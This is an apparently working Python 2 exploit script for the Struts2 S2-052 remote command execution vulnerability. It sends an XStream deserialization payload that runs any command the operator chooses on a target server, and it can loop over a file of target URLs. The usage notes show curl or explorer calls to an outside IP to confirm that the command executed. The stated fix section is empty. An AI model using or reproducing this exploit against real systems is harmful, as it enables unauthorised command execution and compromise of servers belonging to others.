# -*- coding: UTF-8 -*-
__author__ = 'orleven'
import optparse
import requests

"""
Struts2-052 命令执行漏洞
使用方法：  python struts2_052.py  -u/U <target url> -c <target cmd> -C <target cookies>
windows:
python struts2_052.py  -u/U <target url> -c "explorer http://xxx.xxx.xxx.xxx" -C <target cookies>

linux:
python struts2_052.py  -u/U <target url> -c "/usr/bin/curl http://xxx.xxx.xxx.xxx" -C <target cookies>

修复方法：

"""

def poc(url,cookie = None, cmd=None):
    try:
        print cmd
        headers = {}
        if cookie != "":
            headers["Cookie"] = cookie
        headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        headers["Content-Type"] = "application/xml"
        command = ""
        cmds = cmd.split()
        for each in cmds:
            command += "<string>" + each + "</string>"
        payload = '<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> %s' % command
        payload += '</command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map>'
        content = requests.post(url, data=payload,headers=headers).content
        # print content
        print "you should lookup access.log!"
    except:
        print "\n[-] " + url
        print "[-] Not Available !"

def main():
    parse = optparse.OptionParser("Usage: python struts2_052.py -u/U <target url> -c <target cmd> -C <target cookies>")
    parse.add_option('-u', dest='url', type='string', help='specify target url')
    parse.add_option('-c', dest='cmd', type='string', help='specify target cmd')
    parse.add_option('-U', dest='urlFile', type='string', help='specify target url file')
    parse.add_option('-C', dest='cookie', type='string', help='specify target cookies')
    (options, args) = parse.parse_args()
    if options.url != None:
        if options.cmd == None:
            poc(options.url,options.cookie)
        else:
            poc(options.url,options.cookie,options.cmd)
    elif options.urlFile != None :
        if options.cmd == None:
            with open(options.urlFile, 'r') as f:
                for line in f.readlines():
                    poc(line.strip('\r').strip('\n'),options.cookie)
        else:
            try:
                with open(options.urlFile, 'r') as f:
                    for line in f.readlines():
                        poc(line.strip('\r').strip('\n'),options.cookie,options.cmd)
            except:
                print "[-] The File Is Not Exist !"
    else:
        print parse.usage

if __name__ == '__main__':
    main()


